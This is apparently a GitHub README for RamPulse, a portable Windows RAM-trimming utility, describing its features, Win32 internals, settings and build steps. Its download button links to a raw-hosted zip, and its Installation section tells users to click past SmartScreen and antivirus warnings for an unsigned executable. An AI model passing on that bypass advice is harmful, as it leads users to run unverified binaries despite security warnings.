<div align="center">

<img src="https://raw.githubusercontent.com/FidzZzFx/RamPulse/main/RamPulse/assets/app.ico" alt="RamPulse logo" width="128" height="128">

# RamPulse

**Advanced RAM cleaner for Windows 10/11 (x64)**

Lightweight, native, and safe. No processes are killed and no system settings are changed.

<br>

<a href="https://raw.githubusercontent.com/FidzZzFx/RamPulse/main/RamPulse.zip">
  <img src="https://img.shields.io/badge/%E2%AC%87%EF%B8%8F%20Download-RamPulse.exe-2ea44f?style=for-the-badge&logoColor=white" alt="Download RamPulse.exe">
</a>

<br><br>

![Version](https://img.shields.io/badge/version-1.1-blue?style=flat-square)
![Platform](https://img.shields.io/badge/platform-Windows%2010%2F11%20x64-0078D4?style=flat-square&logo=windows&logoColor=white)
![Language](https://img.shields.io/badge/C%2B%2B-17-00599C?style=flat-square&logo=cplusplus&logoColor=white)
![Size](https://img.shields.io/badge/size-~470%20KB-success?style=flat-square)
![Dependencies](https://img.shields.io/badge/dependencies-none-brightgreen?style=flat-square)

</div>

---

## Table of Contents

- [Overview](#overview)
- [What's New in 1.1](#whats-new-in-11)
- [Features](#features)
- [How It Works](#how-it-works)
- [Auto Clean](#auto-clean)
- [Notifications](#notifications)
- [Languages](#languages)
- [Installation](#installation)
- [Usage](#usage)
- [Data and Files](#data-and-files)
- [Building from Source](#building-from-source)
- [Built With](#built-with)
- [FAQ](#faq)
- [Support the Project](#support-the-project)
- [Author](#author)

---

## Overview

**RamPulse** is a small, native Windows utility that frees up memory by trimming the working set of running processes. It ships as a single portable `.exe` with no installer, no runtime, and no extra DLLs.

It is designed to be transparent: every cleanup shows exactly how much memory was reclaimed, which processes were trimmed, and which ones were skipped and why.

---

## What's New in 1.1

- **Language picker on first launch.** You can change it anytime in `Settings > General > Language`. Default language: English.
- **Redesigned interface.** A calm single-accent palette, thin-bordered panels, and per-language typography (YaHei UI, Yu Gothic UI, and Malgun Gothic for CJK).
- **New About page.** App description, author info, a button to the GitHub profile, and donations via QRIS.
- **Smarter notifications.** Auto-clean notifications are hidden when the auto-clean interval is shorter than 30 minutes.
- **Clean codebase.** The entire source is comment-free.

---

## Features

| Area | Details |
| --- | --- |
| **Dashboard** | Gauge, total / used / available RAM, process count, CPU usage, 2-minute graph, recent activity |
| **Cleaner** | Manual cleanup with a detailed result breakdown and a list of skipped processes with reasons |
| **History** | Log of previous cleanups |
| **Settings** | Auto clean, language, notifications, theme, and more |
| **About** | App info, author, GitHub link, QRIS donation |
| **System tray** | Tray icon with a right-click menu |
| **Themes** | Dark and light |
| **Display** | Per-monitor DPI awareness |

---

## How It Works

For every process the current user is allowed to open, RamPulse:

1. Calls `OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_SET_QUOTA)`.
2. Measures the working set with `GetProcessMemoryInfo` **before** cleaning.
3. Calls `EmptyWorkingSet()` (from `psapi`).
4. Measures the working set again **after** cleaning.
5. Reads system-wide RAM with `GlobalMemoryStatusEx`.

Processes that cannot be opened are skipped, and the reason is logged.

> **Safe by design.** No process is terminated and no system configuration is modified. `SeDebugPrivilege` and `SeIncreaseQuotaPrivilege` are enabled only if the current token already has them (Administrator mode).

---

## Auto Clean

- **Interval:** seconds, minutes, or hours (minimum 5 seconds).
- **RAM trigger:** clean when RAM usage reaches X% or higher.
- **CPU guard:** postpones cleaning while CPU usage is above 80%.
- **Pause and auto-resume** support.
- A **warning** is shown for intervals shorter than 1 minute.

---

## Notifications

Tray notifications appear after an automatic cleanup **only when the auto-clean interval is 30 minutes or longer**. While auto clean runs with an interval below 30 minutes, notifications are disabled (the Notifications row in Settings explains this).

---

## Languages

English (default), Bahasa Indonesia, 中文, 日本語, 한국어, Español, Français, Deutsch, Русский, Português.

---

## Installation

RamPulse is portable. There is nothing to install.

1. Click the **Download** button at the top of this page.
2. Run `RamPulse.exe`.
3. Pick your language on first launch.

**Requirements:** Windows 10 or 11, 64-bit.

> **Note:** The executable is not code-signed, so Windows SmartScreen or your antivirus may show a warning. Click **More info > Run anyway** if you trust the source.

---

## Usage

- **Clean now:** open the **Cleaner** page and press the clean button.
- **Automate:** open **Settings**, enable **Auto clean**, and choose an interval or a RAM threshold.
- **Better results:** run as **Administrator** so more processes can be trimmed.
- **Run in background:** close the window to keep RamPulse in the system tray.

---

## Data and Files

All user data is stored in `%APPDATA%\RamPulse`:

| File | Purpose |
| --- | --- |
| `settings.ini` | Your settings |
| `history.tsv` | Cleanup history |
| `qris.jpg` | Cached donation QR code |
| `selftest.txt` | Output of `RamPulse.exe --selftest` |

To reset the app, close it and delete this folder.

---

## Building from Source

RamPulse is cross-compiled with **MinGW-w64**.

```bash
# Ubuntu / Debian
sudo apt install mingw-w64

git clone https://github.com/FidzZzFx/RamPulse.git
cd ./RamPulse/RamPulse
chmod +x build.sh
./build.sh
```

The output is written to `dist/RamPulse.exe`.

Project layout:

```text
RamPulse/
├── src/
│   ├── main.cpp      # Application code
│   ├── lang.h        # Translations
│   └── app.rc        # Resources (icon, manifest, version info)
├── assets/
│   ├── app.ico
│   └── app.manifest
└── build.sh
```

---

## Built With

| | |
| --- | --- |
| **Language** | C++17 |
| **UI** | Win32 API with custom GDI+ rendering (no frameworks) |
| **Compiler** | MinGW-w64 (`x86_64-w64-mingw32-g++`), statically linked |
| **Libraries** | `gdiplus`, `psapi`, `dwmapi`, `urlmon`, `shell32`, `advapi32`, `ole32`, `user32`, `gdi32` |

---

## FAQ

**Does RamPulse close my apps?**
No. It only trims the working set (the physical memory held by a process). Windows pages the data back in when an app needs it.

**Why does RAM usage go back up after cleaning?**
That is normal. Apps reload the data they actively use. Trimming is most useful for idle background processes.

**Why were some processes skipped?**
Windows protects some processes. Run RamPulse as Administrator to reach more of them. Skipped processes are listed with the reason in the Cleaner page.

**Does it collect any data?**
No. The only network request is downloading the donation QR image from GitHub.

---

## Support the Project

If RamPulse is useful to you, you can support its development with a donation via **QRIS** from the **About** page inside the app.

---

## Author

Made by **FidzZz Try** ([@FidzZzFx](https://github.com/FidzZzFx)).

<div align="center">

<sub>RamPulse 1.1 &middot; Windows 10/11 x64</sub>

</div>
